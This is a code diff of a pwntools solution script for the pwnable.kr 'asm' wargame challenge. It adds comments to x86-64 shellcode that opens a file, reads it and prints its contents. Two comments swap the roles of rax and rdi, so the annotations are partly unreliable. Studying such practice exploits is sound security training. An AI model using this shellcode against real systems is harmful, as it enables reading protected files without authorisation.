@@ -1,5 +1,4 @@
 from pwn import *
-import binascii
 
 # asm
 host = 'pwnable.kr'
@@ -19,20 +18,20 @@ def attack():
   print p.recv()
   context.update(arch='amd64', os='linux')
   shellcode = ''
-  shellcode += asm('lea rdi, [rip]')
-  shellcode += asm('add rdi, 51')
-  shellcode += asm('mov rax, 2')
-  shellcode += asm('syscall')
-  shellcode += asm('mov rsi, rdi')
-  shellcode += asm('mov rdi, rax')
-  shellcode += asm('mov rdx, 30')
-  shellcode += asm('mov rax, 0')
-  shellcode += asm('syscall')
-  shellcode += asm('mov rax, 1')
-  shellcode += asm('mov rdi, 0')
-  shellcode += asm('syscall')
-  shellcode += filename + '\x00'
-  p.send(shellcode)
+  shellcode += asm('lea rdi, [rip]') # get current inst. pointer
+  shellcode += asm('add rdi, 51')    # offset it to point to our filename below
+  shellcode += asm('mov rax, 2')     # syscall number for open()
+  shellcode += asm('syscall')        # open("this_is...", 0)
+  shellcode += asm('mov rsi, rdi')   # write to the buffer with our filename
+  shellcode += asm('mov rdi, rax')   # read from returned file desc. from open()
+  shellcode += asm('mov rdx, 30')    # read 30 bytes of data
+  shellcode += asm('mov rax, 0')     # syscall number for read()
+  shellcode += asm('syscall')        # read(fd, buf, 30)
+  shellcode += asm('mov rax, 1')     # stdout is 1
+  shellcode += asm('mov rdi, 1')     # syscall number for write
+  shellcode += asm('syscall')        # write(STDOUT, buf, 30)
+  shellcode += filename + '\x00'     # our buffer, which initially has filename
+  p.send(shellcode)                  # ended with a null byte
   print p.recv()
 
 if __name__ == '__main__':
